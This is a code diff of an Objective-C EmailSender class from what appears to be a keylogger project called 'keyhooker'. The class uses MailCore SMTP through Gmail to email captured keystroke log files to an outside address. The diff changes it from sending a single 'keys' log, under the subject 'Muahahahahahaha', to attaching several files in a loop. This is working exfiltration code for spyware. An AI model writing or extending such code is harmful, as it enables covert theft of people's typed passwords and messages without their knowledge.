@@ -10,7 +10,7 @@
 
 @implementation EmailSender
 
-+ (void)sendEmailWithMail: (NSString *) toAddress withSubject: (NSString *) subject Attachments: (NSArray *) attachments {
++ (void)sendEmailWithMail: (NSString *)toAddress Attachments: (NSArray *)attachments {
     MCOSMTPSession *smtpSession = [[MCOSMTPSession alloc] init];
     smtpSession.hostname = @"smtp.gmail.com";
     smtpSession.port = 465;
@@ -20,19 +20,19 @@
     smtpSession.connectionType = MCOConnectionTypeTLS;
     
     MCOMessageBuilder *builder = [[MCOMessageBuilder alloc] init];
-    MCOAddress *from = [MCOAddress addressWithDisplayName:@"keyhooker"
-                                                  mailbox:@"keyboardhoooker@gmail.com"];
-    MCOAddress *to = [MCOAddress addressWithDisplayName:nil
-                                                mailbox:toAddress];
+    MCOAddress *from = [MCOAddress addressWithDisplayName:@"keyhooker" mailbox:@"keyboardhoooker@gmail.com"];
+    MCOAddress *to = [MCOAddress addressWithDisplayName:nil mailbox:toAddress];
     [[builder header] setFrom:from];
     [[builder header] setTo:@[to]];
-    [[builder header] setSubject:@"Muahahahahahaha"];
+    [[builder header] setSubject:@""];
     
-    NSString *path = [NSString stringWithFormat:@"%@%@", [FileManager pathToFile], @"keys"];
     
-    // Добавляем файл с логом пользователя
-    MCOAttachment *att = [MCOAttachment attachmentWithData:[NSData dataWithContentsOfFile:path] filename:@"attachment"];
-    [builder addAttachment:att];
+    for (int i = 0; i < [attachments count]; i++) {
+        NSString *path = [NSString stringWithFormat:@"%@%@", [FileManager pathToFile], attachments[i]];
+        
+        MCOAttachment *att = [MCOAttachment attachmentWithData:[NSData dataWithContentsOfFile:path] filename:attachments[i]];
+        [builder addAttachment:att];
+    }
     
     // Текст сообщения
     [builder setHTMLBody:[Time currentFullTime]];
